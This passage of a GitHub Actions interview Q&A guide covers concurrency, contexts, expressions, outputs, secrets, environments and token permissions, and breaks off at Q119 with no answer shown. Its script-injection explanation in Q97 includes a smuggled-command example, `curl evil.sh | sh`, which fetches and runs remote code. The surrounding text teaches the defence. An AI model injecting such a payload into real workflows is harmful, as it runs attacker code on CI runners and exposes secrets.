### Q56. Can a matrix job produce outputs for downstream jobs? 🔴

<details>
<summary><b>Answer</b></summary>

Job outputs from a matrix are not merged; all legs write the same output name and the last one to finish wins, which is nondeterministic. Patterns that work:

- Output names are static, so legs cannot write `digest-${{ matrix.arch }}` as separate outputs. Instead each leg uploads an artifact named per leg (`digest-amd64`, `digest-arm64`), and a fan-in job downloads them with `pattern: digest-*` and `merge-multiple: true`.
- Or write results to a store (S3, a check run, a PR comment) keyed by the matrix value.

</details>

### Q57. What does `concurrency` guarantee, exactly? 🔴

<details>
<summary><b>Answer</b></summary>

Within a concurrency group (workflow level or job level), at most **one running and one pending** run or job exist. When a new one arrives, any existing **pending** one is cancelled and replaced. With `cancel-in-progress: true`, the running one is cancelled as well. Without it, the new one waits. It does not queue more than one: a burst of five pushes results in the first running and only the last pending, which is perfect for deploys ("deploy latest") and wrong for anything that needs every commit processed.

</details>

### Q58. Write the standard concurrency setting for PR CI and for production deploys. 🟢

<details>
<summary><b>Answer</b></summary>

```yaml
# PR CI: newer commits make older runs pointless
concurrency:
  group: ${{ github.workflow }}-${{ github.event.pull_request.number || github.ref }}
  cancel-in-progress: true
```

```yaml
# Deploy job: never cancel a deploy halfway, serialize per environment
jobs:
  deploy:
    environment: prod
    concurrency:
      group: deploy-prod
      cancel-in-progress: false
```

</details>

### Q59. How do you cancel in progress only for PRs but not on `main`? 🟡

<details>
<summary><b>Answer</b></summary>

`cancel-in-progress` accepts an expression:

```yaml
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}
```

On `main` every commit's pipeline finishes (useful when each merge must produce an image), while PR branches drop stale runs.

</details>

### Q60. What is the scope of a concurrency group name: repo, org, or workflow? 🔴

<details>
<summary><b>Answer</b></summary>

Groups are scoped to the repository, across all workflows. Two different workflows using `group: deploy-prod` serialize against each other, which is exactly what you want for a shared environment and exactly what you do not want when two unrelated workflows accidentally pick a generic name like `ci`. When a reusable workflow defines concurrency using `github.workflow`, that resolves to the **caller's** workflow name, so different callers get different groups. Include the environment or a specific prefix in group names.

</details>

### Q61. How does `if` at step level differ from job level? 🟢

<details>
<summary><b>Answer</b></summary>

Both accept expressions and get an implicit `success()` unless a status function is present. Job-level `if` is evaluated before a runner is assigned, so the `steps` and `runner` contexts are not available there, and `env` defined in the same job is not available either. Step-level `if` can use `steps.*.outputs`, `env`, `runner.os` and everything defined earlier in the job. You can omit `${{ }}` in `if`, except when the expression starts with `!`, where YAML needs the braces or quotes.

</details>

### Q62. Why does `if: !startsWith(github.ref, 'refs/tags/')` break the workflow file? 🟡

<details>
<summary><b>Answer</b></summary>

In YAML, a value starting with `!` is a tag indicator, so the parser fails or misreads it. Wrap it:

```yaml
if: ${{ !startsWith(github.ref, 'refs/tags/') }}
```

or quote it: `if: "!startsWith(github.ref, 'refs/tags/')"`. Same issue for values starting with `*` or `&`.

</details>

### Q63. What does `continue-on-error` at job level do to the run and to branch protection? 🟡

<details>
<summary><b>Answer</b></summary>

The job can fail without failing the run, and `needs.<job>.result` reports `success` for dependents, so the pipeline continues. The job itself is still shown with a failure marker in the run UI, which is easy to ignore. Do not rely on it for required checks; gate merges on a fan-in job you control. Typical use is an experimental matrix leg:

```yaml
continue-on-error: ${{ matrix.experimental == true }}
```

Do not use it to hide flaky tests; the failure disappears from everyone's attention.

</details>

### Q64. How do you create a single required status check for a pipeline with many jobs? 🟡

<details>
<summary><b>Answer</b></summary>

Add a fan-in job that depends on everything, always runs, and fails if any dependency did not succeed:

```yaml
ci-ok:
  if: always()
  needs: [lint, test, build]
  runs-on: ubuntu-24.04
  steps:
    - run: |
        echo '${{ toJSON(needs) }}' | jq -e 'all(.[]; .result == "success" or .result == "skipped")'
```

Make only `ci-ok` required in branch protection. Matrix renames and new jobs no longer require changing protection settings, and skipped path-filtered jobs do not block merges.

</details>

### Q65. What is the difference between job-level `env` and `steps[*].env`, and can a job's `env` reference `matrix`? 🟢

<details>
<summary><b>Answer</b></summary>

Workflow `env` applies to all jobs, job `env` to all steps in that job, step `env` to that step; the most specific wins. Job `env` can use `matrix`, `needs`, `vars`, `secrets`, `inputs` and `github`. It cannot reference other keys in the same `env` map or `steps` outputs (they do not exist yet at that level).

```yaml
env:
  NODE_VERSION: ${{ matrix.node }}
  IMAGE: ${{ vars.ECR_REGISTRY }}/shack-api
```

</details>

### Q66. How do you run a step only on a specific OS in a cross-platform matrix? 🟢

<details>
<summary><b>Answer</b></summary>

Use the `runner` context at step level:

```yaml
- if: runner.os == 'Windows'
  shell: pwsh
  run: Get-ChildItem env:
- if: runner.os != 'Windows'
  run: env | sort
```

`runner.os` is `Linux`, `Windows` or `macOS`; `runner.arch` is `X64` or `ARM64`.

</details>

### Q67. What is `jobs.<id>.environment` beyond approvals, and how do you set a deployment URL? 🟡

<details>
<summary><b>Answer</b></summary>

Naming an environment creates a GitHub deployment record, applies protection rules, exposes environment secrets and variables to the job, and changes the OIDC `sub` claim to `repo:ORG/REPO:environment:NAME`.

```yaml
deploy:
  environment:
    name: staging
    url: ${{ steps.out.outputs.url }}
```

The URL appears on the PR and the environments page. The environment name can be an expression, which is how one reusable workflow serves dev, staging and prod.

</details>

### Q68. Can steps in one job run in parallel? 🟡

<details>
<summary><b>Answer</b></summary>

No, steps are strictly sequential. For parallelism, split work into separate jobs (or a matrix), or run background processes inside one step and `wait` for them:

```bash
npm run test:unit & npm run test:lint & wait -n && wait -n
```

Jobs cost a runner start-up each (roughly 10 to 30 seconds on hosted runners plus setup like checkout and dependency restore), so do not split tiny tasks into separate jobs.

</details>

### Q69. How do you limit a job to run only for a specific actor or bot? 🟢

<details>
<summary><b>Answer</b></summary>

```yaml
if: github.actor == 'dependabot[bot]'
```

`github.actor` is who triggered the run; `github.triggering_actor` is who triggered this particular attempt (differs on re-runs). For PRs, `github.event.pull_request.user.login` is the PR author. Do not use actor checks as a security boundary for privileged actions without also checking the event type, since actor names are matched as strings.

</details>

### Q70. What happens when you re-run a workflow: which attempts, tokens and code are used? 🟡

<details>
<summary><b>Answer</b></summary>

A re-run creates a new attempt (`github.run_attempt` increments) of the same run, using the **same** commit SHA and the **same** workflow file version, and the original event payload. New `GITHUB_TOKEN`s are minted. "Re-run failed jobs" re-runs failed jobs and their dependents only, reusing outputs from successful jobs. Environment approvals are required again. Secrets are read fresh, so a rotated secret takes effect on re-run, but a fixed workflow file does not: push a new commit for that.

</details>

### Q71. What does `jobs.<id>.strategy.matrix` allow as values: only scalars? 🟡

<details>
<summary><b>Answer</b></summary>

Values can be scalars, objects or arrays. Objects make readable matrices:

```yaml
matrix:
  target:
    - { name: api, path: services/api, dockerfile: Dockerfile }
    - { name: web, path: apps/web, dockerfile: Dockerfile.web }
steps:
  - run: docker build -f ${{ matrix.target.path }}/${{ matrix.target.dockerfile }} ${{ matrix.target.path }}
```

The whole matrix can also be one `fromJSON` expression, as long as it evaluates to an object or the variable to an array.

</details>

### Q72. How do you make a job that only runs after a matrix job if all legs passed, and another that runs if any leg failed? 🟡

<details>
<summary><b>Answer</b></summary>

`needs` on a matrix job waits for all legs, and `result` is aggregated.

```yaml
publish:
  needs: test            # implicit success(): all legs passed
notify:
  needs: test
  if: ${{ failure() }}   # any leg failed
  runs-on: ubuntu-24.04
  steps:
    - run: echo "Tests failed on run ${{ github.run_id }}"
```

</details>

### Q73. How do `jobs.<id>.outputs` work? 🟢

<details>
<summary><b>Answer</b></summary>

A job declares outputs mapped from step outputs; downstream jobs read them through `needs`.

```yaml
build:
  outputs:
    digest: ${{ steps.push.outputs.digest }}
  steps:
    - id: push
      run: echo "digest=sha256:abc..." >> "$GITHUB_OUTPUT"
deploy:
  needs: build
  steps:
    - run: echo "Deploying ${{ needs.build.outputs.digest }}"
```

Outputs are strings, up to 1 MB per job and 50 MB per run in total. Values that contain a secret are dropped with a warning.

</details>

### Q74. What is `jobs.<id>.timeout-minutes` vs `steps[*].timeout-minutes`, and which takes precedence? 🟢

<details>
<summary><b>Answer</b></summary>

The job timeout limits the whole job including setup; a step timeout limits one step. Both apply independently: whichever expires first cancels. A step timing out fails that step (then `if: always()` cleanup steps can still run) until the job timeout, which cancels everything. Put a short step timeout on network-dependent steps like `kubectl rollout status` (or use its own `--timeout`).

</details>

### Q75. What does `jobs.<id>.permissions` do when the workflow also has top-level `permissions`? 🟡

<details>
<summary><b>Answer</b></summary>

The job-level block fully replaces the workflow-level block for that job; it does not merge. If the workflow sets `contents: read` and a job sets `id-token: write` only, that job loses `contents: read` and `actions/checkout` fails on private repos. Always restate what the job needs:

```yaml
permissions:
  contents: read
  id-token: write
```

</details>

### Q76. What is the maximum number of jobs, and other per-run limits worth knowing? 🔴

<details>
<summary><b>Answer</b></summary>

Commonly cited limits: 256 jobs from one matrix; job outputs 1 MB each and 50 MB total per run; 10 GB cache per repo by default; a run lasts at most 35 days; a hosted job 6 hours; a job waits in queue at most 24 hours. Concurrency of hosted jobs per account depends on the plan (for example 20 for Free, 60 for Team, more for Enterprise, with lower limits for macOS). When a plan's concurrency is exhausted, jobs queue, which looks like "slow CI".

</details>

### Q77. How do you run cleanup or notification logic that must always run at the end of a job? 🟢

<details>
<summary><b>Answer</b></summary>

Put it in a final step with `if: always()` (or `!cancelled()` if it should not run on cancel):

```yaml
- name: Tear down test env
  if: always()
  run: terraform destroy -auto-approve
- name: Notify on failure
  if: failure()
  run: curl -fsS -X POST "$SLACK_WEBHOOK" -d '{"text":"build failed"}'
  env:
    SLACK_WEBHOOK: ${{ secrets.SLACK_WEBHOOK }}
```

JavaScript actions can also define `post:` scripts that run at job end automatically (that is how `actions/cache` saves).

</details>

### Q78. What is the order of execution of `pre`, main and `post` steps for actions? 🔴

<details>
<summary><b>Answer</b></summary>

JavaScript and Docker actions can define `pre`, `main` and `post` entry points. All `pre` scripts run at the start of the job (during "Set up job", in step order), then the main steps in order, then all `post` scripts in **reverse** order at job end ("Post Run actions/cache@v4"). `post-if` defaults to `always()`. This is why caches save even when a later step fails, and why `actions/checkout`'s post step removes the persisted credentials.

</details>

---

## Contexts, Expressions, Env & Outputs

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q79. List the available contexts and what each holds. 🟢

<details>
<summary><b>Answer</b></summary>

`github` (event, repo, ref, sha, actor, run IDs, token), `env` (variables from workflow/job/step env), `vars` (configuration variables), `secrets`, `inputs` (dispatch or workflow_call inputs), `job` (container and services info, status), `jobs` (outputs of jobs, only in reusable workflows for defining outputs), `steps` (outputs, outcome, conclusion of earlier steps with an `id`), `runner` (os, arch, temp, tool_cache), `strategy` (fail-fast, job-index, job-total), `matrix`, and `needs` (outputs and results of dependency jobs).

</details>

### Q80. Which contexts can you use in which keys? Give two examples that trip people up. 🔴

<details>
<summary><b>Answer</b></summary>

Availability is per key, documented in the "context availability" table. Two common traps:

- `jobs.<id>.runs-on` can use `github`, `needs`, `strategy`, `matrix`, `vars`, `inputs`, but **not** `env` or `secrets`.
- `jobs.<id>.if` cannot use `env`, `steps` or `runner`, and **no** `if` can reference `secrets` directly (`Unrecognized named-value: 'secrets'`). Map the secret into `env` at job level and test `env.X != ''` at step level.

`concurrency` at workflow level cannot use `env`, `matrix` or `needs` either.

</details>

### Q81. What are the expression operators and how do comparisons coerce types? 🟡

<details>
<summary><b>Answer</b></summary>

Operators: `( )`, `[ ]`, `.`, `!`, `<`, `<=`, `>`, `>=`, `==`, `!=`, `&&`, `||`. String comparison is case-insensitive (`'Main' == 'main'` is true). Mismatched types are coerced to numbers: null to 0, booleans to 1 or 0, strings parsed as numbers (empty string is 0, non-numeric is `NaN`, and `NaN` never equals anything). Objects and arrays are equal only if they are the same instance. So `'true' == true` is false, and `'' == 0` is true.

</details>

### Q82. How do you write a ternary in GitHub Actions expressions? 🟡

<details>
<summary><b>Answer</b></summary>

Use `cond && a || b`:

```yaml
env:
  REPLICAS: ${{ github.ref == 'refs/heads/main' && '3' || '1' }}
```

Trap: if `a` is falsy (`''`, `0`, `false`, `null`), you always get `b`. `${{ x && 0 || 5 }}` always returns 5. Use strings for such values, or restructure the condition.

</details>

### Q83. What do `contains`, `startsWith`, `endsWith`, `format` and `join` do? 🟢

<details>
<summary><b>Answer</b></summary>

```yaml
if: contains(github.event.pull_request.labels.*.name, 'deploy-preview')
if: startsWith(github.ref, 'refs/tags/v')
if: endsWith(github.repository, '-infra')
run: echo "${{ format('{0}/{1}:{2}', vars.REGISTRY, 'api', github.sha) }}"
run: echo "Targets ${{ join(matrix.targets, ', ') }}"
```

`contains` works on strings (substring, case-insensitive) and arrays (element match). `format` uses `{0}` placeholders and `{{` to escape braces.

</details>

### Q84. What are object filters (`.*`) and how are they useful? 🟡

<details>
<summary><b>Answer</b></summary>

`.*` projects a property from every element of an array or every value of an object, producing an array. Examples:

```yaml
if: contains(github.event.pull_request.labels.*.name, 'skip-e2e')
if: contains(needs.*.result, 'failure')
if: contains(github.event.commits.*.message, '[migrate]')
```

`contains(needs.*.result, 'failure')` in a fan-in job checks every dependency in one expression.

</details>

### Q85. What do `toJSON` and `fromJSON` do, and give a real use of each? 🟡

<details>
<summary><b>Answer</b></summary>

`toJSON(value)` serializes a context to pretty JSON: `run: echo '${{ toJSON(github.event) }}'` for debugging (dump through `env` to avoid quoting issues). `fromJSON(string)` parses JSON into an object, array, boolean or number:

```yaml
strategy:
  matrix: ${{ fromJSON(needs.plan.outputs.matrix) }}
timeout-minutes: ${{ fromJSON(vars.DEPLOY_TIMEOUT) }}
if: fromJSON(inputs.run_e2e)
```

The second one is how you get a number from a string variable where a number is required.

</details>

### Q86. How does `hashFiles` work and where can it be used? 🟡

<details>
<summary><b>Answer</b></summary>

`hashFiles('**/package-lock.json')` returns a SHA-256 hash of all matching files under `GITHUB_WORKSPACE` (sorted, then combined), or an empty string if nothing matches. Multiple patterns and negation are allowed: `hashFiles('**/go.sum', '!vendor/**')`. It is evaluated on the runner, so it works in step-level keys like a cache `key`, not in job-level `if` or `runs-on`. It must finish within a time limit, so avoid patterns that scan `node_modules` in a huge workspace.

</details>

### Q87. How do you write a step output, including a multiline value? 🟢

<details>
<summary><b>Answer</b></summary>

Append to the `$GITHUB_OUTPUT` file. Multiline values use a heredoc-style delimiter, which should be random for untrusted content:

```bash
echo "tag=v1.4.0" >> "$GITHUB_OUTPUT"

delim="EOF_$(openssl rand -hex 8)"
{
  echo "notes<<$delim"
  git log --oneline v1.3.0..HEAD
  echo "$delim"
} >> "$GITHUB_OUTPUT"
```

Read as `steps.<id>.outputs.notes`. The step needs an `id`.

</details>

### Q88. Why was `::set-output` deprecated, and what replaced it? 🟡

<details>
<summary><b>Answer</b></summary>

`::set-output name=x::value` and `::set-env` were parsed from stdout, so any process that could print to the log (for example, a test printing attacker-controlled input) could inject outputs or environment variables, including `LD_PRELOAD` or `NODE_OPTIONS`. They were replaced by **environment files**: `$GITHUB_OUTPUT`, `$GITHUB_ENV`, `$GITHUB_PATH`, `$GITHUB_STATE`, which only the step's own process writes. Old syntax prints a deprecation warning or is disabled.

</details>

### Q89. How do `$GITHUB_ENV` and `$GITHUB_PATH` work, and when does a value become visible? 🟢

<details>
<summary><b>Answer</b></summary>

Lines appended to `$GITHUB_ENV` become environment variables in **subsequent** steps of the same job, not the current step. Lines appended to `$GITHUB_PATH` are prepended to `PATH` for subsequent steps.

```bash
echo "IMAGE_TAG=sha-${GITHUB_SHA::7}" >> "$GITHUB_ENV"
echo "$HOME/.local/bin" >> "$GITHUB_PATH"
```

In the same step, also `export IMAGE_TAG=...` if you need it right away. Never write untrusted data to `GITHUB_ENV`: a newline lets an attacker set arbitrary variables.

</details>

### Q90. How do you mask a value in logs that is not a registered secret? 🟡

<details>
<summary><b>Answer</b></summary>

```bash
TOKEN=$(vault read -field=token secret/ci)
echo "::add-mask::$TOKEN"
echo "TOKEN=$TOKEN" >> "$GITHUB_ENV"
```

From then on, that exact string is replaced by `***` in logs. Masking is by exact match, so derived forms (base64, URL-encoded, a substring) are not masked; mask each form you print. Mask before the first time it could appear in output.

</details>

### Q91. What are `$GITHUB_STATE` and `$RUNNER_TEMP` used for? 🔴

<details>
<summary><b>Answer</b></summary>

`$GITHUB_STATE` lets a JavaScript action's `main` script pass values to its own `post` script (available as `STATE_<name>` env), for example a temporary directory to clean up or a cache key to save. `$RUNNER_TEMP` is a temp directory emptied at the start and end of each job; use it for kubeconfigs, credentials files and scratch data rather than `$GITHUB_WORKSPACE`, which may be uploaded as an artifact or persist on self-hosted runners.

</details>

### Q92. How do you pass data from a step in one job to a step in another job? 🟢

<details>
<summary><b>Answer</b></summary>

Three hops: step output to job output to `needs`.

```yaml
jobs:
  version:
    runs-on: ubuntu-24.04
    outputs:
      semver: ${{ steps.v.outputs.semver }}
    steps:
      - id: v
        run: echo "semver=1.4.$GITHUB_RUN_NUMBER" >> "$GITHUB_OUTPUT"
  build:
    needs: version
    runs-on: ubuntu-24.04
    steps:
      - run: echo "Version ${{ needs.version.outputs.semver }}"
```

For files, use artifacts.

</details>

### Q93. What are the `github.ref`, `github.ref_name`, `github.head_ref` and `github.base_ref` values for a PR from `feature/x` into `main`? 🟡

<details>
<summary><b>Answer</b></summary>

For `pull_request`:

- `github.ref`: `refs/pull/42/merge`
- `github.ref_name`: `42/merge`
- `github.head_ref`: `feature/x`
- `github.base_ref`: `main`
- `github.sha`: the test merge commit, not the PR head; the head is `github.event.pull_request.head.sha`

For `push` to `main`: `ref` is `refs/heads/main`, `ref_name` is `main`, and `head_ref`/`base_ref` are empty.

</details>

### Q94. Why might `github.sha` in a PR workflow not match any commit you pushed? 🟡

<details>
<summary><b>Answer</b></summary>

For `pull_request`, GitHub tests a synthetic merge commit of the PR head into the base (`refs/pull/N/merge`). Its SHA exists only on GitHub. Tagging images with `github.sha` in PRs therefore produces tags nobody can trace to a branch commit. Use `github.event.pull_request.head.sha` for traceable tags and status reporting, and keep the merge ref for testing (it catches semantic conflicts with `main`).

</details>

### Q95. What are the `strategy` context values and when are they useful? 🔴

<details>
<summary><b>Answer</b></summary>

`strategy.job-index` (0-based), `strategy.job-total`, `strategy.fail-fast`, `strategy.max-parallel`. Index and total enable test sharding without a matrix of shard numbers:

```yaml
strategy:
  matrix:
    shard: [1, 2, 3, 4]
steps:
  - run: npx playwright test --shard=${{ matrix.shard }}/${{ strategy.job-total }}
```

</details>

### Q96. How do you dump all contexts for debugging without breaking the shell? 🟢

<details>
<summary><b>Answer</b></summary>

Pass them through environment variables, never inline into the script:

```yaml
- name: Dump contexts
  env:
    GITHUB_CONTEXT: ${{ toJSON(github) }}
    NEEDS_CONTEXT: ${{ toJSON(needs) }}
  run: |
    echo "$GITHUB_CONTEXT" | jq '{event_name, ref, sha, actor}'
    echo "$NEEDS_CONTEXT"
```

The `github` context contains the token, but it is masked; still, remove such steps after debugging.

</details>

### Q97. What does `${{ }}` inside a `run:` actually do at runtime? 🔴

<details>
<summary><b>Answer</b></summary>

GitHub evaluates the expression and pastes the resulting text into the script **before** writing the script to a temp file on the runner. The shell never sees the expression, only the substituted text. So `run: echo "${{ github.event.issue.title }}"` with a title of `"; curl evil.sh | sh; echo "` becomes three commands. Environment variables are different: the shell expands `"$TITLE"` as data. This single fact explains script injection.

</details>

### Q98. How do you use `vars` and what is the precedence between levels? 🟢

<details>
<summary><b>Answer</b></summary>

Configuration variables are plain-text values set at organization, repository and environment level, read with `${{ vars.NAME }}`. Precedence: environment over repository over organization. They are not masked in logs and should be considered readable by anyone who can see the workflow output. Use them for region names, account IDs, cluster names and feature flags; never for credentials.

```bash
gh variable set AWS_REGION --body ap-south-1
gh variable set CLUSTER_NAME --env prod --body shack-prod
```

</details>

### Q99. How do you set an environment variable whose value depends on the branch? 🟢

<details>
<summary><b>Answer</b></summary>

Either an expression at job or step level:

```yaml
env:
  TARGET_ENV: ${{ github.ref_name == 'main' && 'staging' || 'dev' }}
```

or compute in a step and write to `$GITHUB_ENV`:

```bash
case "$GITHUB_REF_NAME" in
  main) echo "TARGET_ENV=staging" >> "$GITHUB_ENV" ;;
  *)    echo "TARGET_ENV=dev" >> "$GITHUB_ENV" ;;
esac
```

</details>

### Q100. What does the `job` context contain? 🟡

<details>
<summary><b>Answer</b></summary>

`job.status` (success, failure, cancelled), `job.container.id` and `job.container.network` when the job runs in a container, and `job.services.<id>.ports` with the mapped host ports of service containers. That last one is how you avoid fixed ports:

```yaml
services:
  redis:
    image: redis:7
    ports: ["6379"]   # random host port
steps:
  - run: redis-cli -p ${{ job.services.redis.ports['6379'] }} ping
```

</details>

### Q101. Why do outputs disappear with "Skip output 'x' since it may contain secret"? 🔴

<details>
<summary><b>Answer</b></summary>

The runner refuses to pass a job output whose value contains any registered secret or masked string, to prevent secrets leaking across jobs. It also happens when the output merely contains a masked substring, for example an AWS account ID that is also used as a secret, or a short secret like `prod` that appears in many values. Fix: do not register non-secret values as secrets (use `vars`), or pass the data via an artifact, or re-derive it in the downstream job.

</details>

### Q102. How do you read an environment-specific variable in a reusable workflow? 🔴

<details>
<summary><b>Answer</b></summary>

Bind the job to the environment, then read `vars` and `secrets` normally; environment values override repo values once the job is inside the environment.

```yaml
on:
  workflow_call:
    inputs:
      environment: { type: string, required: true }
jobs:
  deploy:
    environment: ${{ inputs.environment }}
    runs-on: ubuntu-24.04
    steps:
      - run: echo "Cluster ${{ vars.CLUSTER_NAME }}"
```

Environment secrets are only available inside the job that declares the environment, not to the caller.

</details>

### Q103. What is `github.token` vs `secrets.GITHUB_TOKEN`? 🟢

<details>
<summary><b>Answer</b></summary>

They are the same token for the current job. `secrets.GITHUB_TOKEN` is the traditional way to pass it; `github.token` is available in contexts where `secrets` is not, such as action defaults (`default: ${{ github.token }}` in `action.yml`). Many actions use it automatically unless you pass `token:`.

</details>

### Q104. How do you compare semantic versions or do arithmetic in expressions? 🔴

<details>
<summary><b>Answer</b></summary>

You do not: expressions have no arithmetic or version comparison functions, and numeric comparison of `'1.10'` vs `'1.9'` gives the wrong answer. Do it in a step with real tools and expose the result as an output:

```bash
if [ "$(printf '%s\n' "$CURRENT" "$NEW" | sort -V | tail -1)" = "$NEW" ]; then
  echo "is_newer=true" >> "$GITHUB_OUTPUT"
fi
```

Keep expressions to routing logic; put computation in scripts that you can test locally.

</details>

---

## Secrets, Variables, Environments & Permissions

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q105. Where can secrets be defined, and what is the precedence? 🟢

<details>
<summary><b>Answer</b></summary>

Organization (optionally restricted to selected repos), repository, and environment. If the same name exists at several levels, the most specific wins: environment over repository over organization. Dependabot and Codespaces have their own separate secret stores. Secret names are case-insensitive, may only contain alphanumerics and underscores, and cannot start with `GITHUB_`.

```bash
gh secret set SLACK_WEBHOOK --body "$URL"
gh secret set DB_PASSWORD --env prod < pw.txt
gh secret set NPM_TOKEN --org devopsshack --repos shack-api,shack-web
```

</details>

### Q106. How are secrets protected in transit and in logs, and what are the limits? 🟡

<details>
<summary><b>Answer</b></summary>

Secrets are encrypted client-side with a libsodium sealed box using the repo or org public key before upload, stored encrypted, and decrypted only when sent to a runner for a job that references them. The runner masks exact values in logs. Limits: 48 KB per secret, 100 secrets per repository, 100 per environment, 1,000 per organization. For larger blobs (certificates, kubeconfigs), store an encryption passphrase as the secret and commit the encrypted file, or better, fetch at runtime from a cloud secret manager via OIDC.

</details>

### Q107. Are secrets available to every step automatically? 🟢

<details>
<summary><b>Answer</b></summary>

No. A secret only reaches a step if you reference it, via `env` or `with`:

```yaml
- run: ./notify.sh
  env:
    SLACK_WEBHOOK: ${{ secrets.SLACK_WEBHOOK }}
```

Scope it to the narrowest step that needs it, not workflow-level `env`, so that third-party actions in other steps never see it. Reusable workflows also get no caller secrets unless passed explicitly or with `secrets: inherit`.

</details>

### Q108. Why is it a bad idea to store structured data like JSON or a whole `.env` file as one secret? 🟡

<details>
<summary><b>Answer</b></summary>

Masking works on the whole registered value and on individual lines of a multiline secret, but not on fields inside JSON on one line. If a tool prints one field, it appears unmasked. You also lose the ability to rotate or scope individual values. Store one secret per value, or keep structured config in a secret manager and register each retrieved value with `::add-mask::`.

</details>

### Q109. What is an environment, and which protection rules can it have? 🟢

<details>
<summary><b>Answer</b></summary>

A named deployment target (`dev`, `staging`, `prod`) with its own secrets, variables and protection rules:

- **Required reviewers**: up to 6 users or teams, any one approval suffices; **prevent self-review** blocks the person who triggered the run.
- **Wait timer**: 1 to 43,200 minutes delay before the job starts.
- **Deployment branches and tags**: all, protected branches only, or selected patterns (`main`, `v*`).
- **Custom deployment protection rules**: GitHub Apps that approve or reject (change windows, monitoring health, ticket checks).
- **Allow administrators to bypass** toggle.

Protection rules on private repos require a paid plan.

</details>

### Q110. When does a job wait for environment approval, and what does the reviewer see? 🟡

<details>
<summary><b>Answer</b></summary>

When the job starts (after its `needs` are done), before a runner is assigned, so waiting costs no minutes. The run shows "Waiting for review: prod needs approval to start deploying changes." Reviewers get a notification and click "Review deployments", choose environments, optionally comment, approve or reject. Environment secrets are released to the job only after approval. A pending approval expires when the workflow run hits its 30-day limit for waiting jobs.

</details>

### Q111. How do deployment branch policies interact with tags and `workflow_dispatch`? 🔴

<details>
<summary><b>Answer</b></summary>

The policy checks `github.ref` of the run against the allowed patterns. A `workflow_dispatch` from a feature branch targeting `prod` is rejected with "Branch 'feature/x' is not allowed to deploy to prod due to environment protection rules." Tag patterns must be added explicitly with type `tag`; allowing only `main` blocks a release workflow triggered by `v1.4.0`.

```bash
gh api -X POST repos/ORG/REPO/environments/prod/deployment-branch-policies \
  -f name='v*' -f type=tag
```

</details>

### Q112. What is the `GITHUB_TOKEN`, and how long does it live? 🟢

<details>
<summary><b>Answer</b></summary>

A GitHub App installation token automatically created for each job, scoped to the repository running the workflow, with permissions from the `permissions` key (or the repo/org default). It expires when the job completes, or after 24 hours at most. It cannot access other repositories (except public ones read-only), cannot trigger most new workflow runs, and is revoked at job end, so leaking it after the fact is low impact. Leaking it during a running job is not.

</details>

### Q113. What are the default `GITHUB_TOKEN` permissions, and how do you change them? 🟡

<details>
<summary><b>Answer</b></summary>

Repos and orgs created after February 2023 default to the **restricted** setting: `contents: read` and `packages: read` (metadata read always). Older ones may still default to **permissive** read/write on most scopes. Change the default in Settings, Actions, General, Workflow permissions (or at org/enterprise level so repos cannot loosen it), and declare `permissions` in every workflow anyway, so the file documents its needs and does not depend on the setting.

</details>

### Q114. List the `permissions` scopes you use most and what needs them. 🟡

<details>
<summary><b>Answer</b></summary>

| Scope | Needed for |
|---|---|
| `contents: read/write` | checkout private repo / push commits, create tags and releases |
| `id-token: write` | requesting an OIDC token |
| `packages: write` | pushing to GHCR |
| `pull-requests: write` | commenting, labeling PRs |
| `issues: write` | issue comments and labels |
| `checks: write` | creating check runs with annotations |
| `statuses: write` | commit statuses |
| `security-events: write` | uploading SARIF to code scanning |
| `attestations: write` | artifact attestations |
| `actions: read/write` | reading or cancelling runs, managing caches |
| `deployments: write` | deployment records outside environments |
| `pages: write` | GitHub Pages deploys |

</details>

### Q115. What does `permissions: {}` do, and `permissions: read-all`? 🟢

<details>
<summary><b>Answer</b></summary>

`permissions: {}` grants nothing (not even `contents: read`), so the token is useless except for public reads; good default for jobs that only lint public code or call external APIs. `read-all` grants read on every scope, `write-all` grants write on every scope. In a public repo, `permissions: {}` at the top with per-job grants is the tightest posture.

</details>

### Q116. Why can `pull_request` workflows from forks not comment on the PR even with `pull-requests: write`? 🟡

<details>
<summary><b>Answer</b></summary>

For fork PRs the `GITHUB_TOKEN` is forced to read-only regardless of the `permissions` key (unless the repo setting "Send write tokens to workflows from fork pull requests" is enabled, which is risky). Writes fail with `Resource not accessible by integration`. Safe pattern: the `pull_request` job uploads the comment body as an artifact, and a `workflow_run` workflow in the base context posts it after validating the data.

</details>

### Q117. What is the difference between `GITHUB_TOKEN`, a fine-grained PAT, and a GitHub App token in workflows? 🟡

<details>
<summary><b>Answer</b></summary>

- `GITHUB_TOKEN`: automatic, per job, single repo, expires at job end, cannot trigger workflows. Default choice.
- **Fine-grained PAT**: tied to a person, multi-repo, long-lived; breaks when the person leaves, and actions appear as them. Avoid.
- **GitHub App token**: minted at runtime with `actions/create-github-app-token`, scoped to selected repos and permissions, valid one hour, acts as the app, does trigger workflows. Use for cross-repo access and release automation.

```yaml
- id: app
  uses: actions/create-github-app-token@v2
  with:
    app-id: ${{ vars.RELEASE_APP_ID }}
    private-key: ${{ secrets.RELEASE_APP_KEY }}
    repositories: shack-api,shack-helm
```

</details>

### Q118. How do secrets work in `if` conditions? 🟡

<details>
<summary><b>Answer</b></summary>

They cannot be referenced directly in `if`. Map to an env var and test the env var at step level:

```yaml
jobs:
  publish:
    runs-on: ubuntu-24.04
    env:
      HAS_NPM_TOKEN: ${{ secrets.NPM_TOKEN != '' }}
    steps:
      - if: env.HAS_NPM_TOKEN == 'true'
        run: npm publish
        env:
          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
```

This is the standard way to skip publish steps on forks where secrets are empty.

</details>

### Q119. What happens if a secret is printed in a different encoding, or split across lines? 🟡

<details>
<summary><b>Answer</b></summary>

